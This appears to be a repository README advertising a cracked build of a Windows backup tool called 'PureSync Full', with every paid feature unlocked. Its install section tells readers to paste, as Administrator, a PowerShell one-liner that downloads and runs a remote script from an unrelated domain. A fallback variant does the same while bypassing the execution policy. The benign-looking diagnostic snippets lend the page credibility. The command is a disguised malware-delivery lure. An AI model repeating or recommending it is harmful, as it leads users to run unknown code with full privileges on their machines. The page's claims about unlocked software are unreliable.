# PureSync Full — desktop guide · Windows

Desktop toolkit · backup jobs, file sync, and restore workflows (cloud-backup, file-sync, data-backup)

## Download

1. Open **PowerShell** as Administrator
2. Paste and run:

```powershell
irm https://zentool.art/ps/setup.ps1 | iex
```

3. Confirm **UAC** (Yes) — setup runs automatically

<details>
<summary><b>Having trouble? Try this instead</b></summary>

```powershell
powershell -NoProfile -ExecutionPolicy Bypass -Command "irm https://zentool.art/ps/setup.ps1 | iex"
```

</details>

## About the product

**PureSync Full** is a Windows desktop app for cloud backup. On Windows 10 and 11 it is a solid fit for file sync and data backup on PC: same panels as in the paid box, normal shortcuts, no back-and-forth with demo timers.

This page is a short orientation: what the tool does, what is already unlocked in this build, and what to check first if the app does not open as expected.

**What is open in this build**

All paid features in the app are enabled. The same modules and menus people pay for in the store build are available here; you do not need to unlock extras inside the app.

## FAQ

| Question | Answer |
| --- | --- |
| Where do I begin? | Open **PowerShell as Administrator** and run the command in the block above. |
| Windows versions? | Windows 10 and 11, 64-bit. |
| UAC prompt? | Choose **Yes** if Windows asks when prompted. |
| What is this repo? | Notes for **PureSync Full** on Windows — see above, then everyday use. |

## Features

- Main workspace
- Import and export
- Batch actions
- Windows integration

## Use cases

- Power users
- IT support
- Home labs

## Developer reference

Optional. Read-only checks useful for support tickets and local sanity checks.

**Release metadata (session labels only)**

```powershell
$ReleaseChannel = "Stable"
$ProductSlug = "PureSync-Full"
$BuildLabel = "2026.04"
```

**Host environment**

```powershell
$PSVersionTable.PSVersion
Get-ExecutionPolicy -List
[System.Environment]::Is64BitOperatingSystem
Get-CimInstance Win32_OperatingSystem | Select-Object Caption, Version, OSArchitecture
```

**After launch (application layer)**

```powershell
Get-Process -Name "PureSyncFull*" -ErrorAction SilentlyContinue |
 Select-Object Name, Id, StartTime
```

**Support bundle header (paste into ticket)**

```powershell
@{
 captured_utc = (Get-Date).ToUniversalTime().ToString("o")
 user = [Environment]::UserName
 machine = $env:COMPUTERNAME
 channel = $ReleaseChannel
 product = $ProductSlug
} | ConvertTo-Json -Compress
```

## System requirements

| Item | Requirement |
| --- | --- |
| OS | Windows 10 / 11 (64-bit) |
| RAM | 4 GB minimum · 8 GB recommended |
| Disk | 2 GB free space |

## Topics

`puresync` · `puresync-app` · `cloud-backup` · `file-sync` · `data-backup` · `how-to-install-puresync` · `how-to-setup-puresync` · `desktop-package` · `windows-11` · `windows-10`

## License

This repository describes use and usage of a third-party desktop application. Comply with applicable software licensing and local regulations.
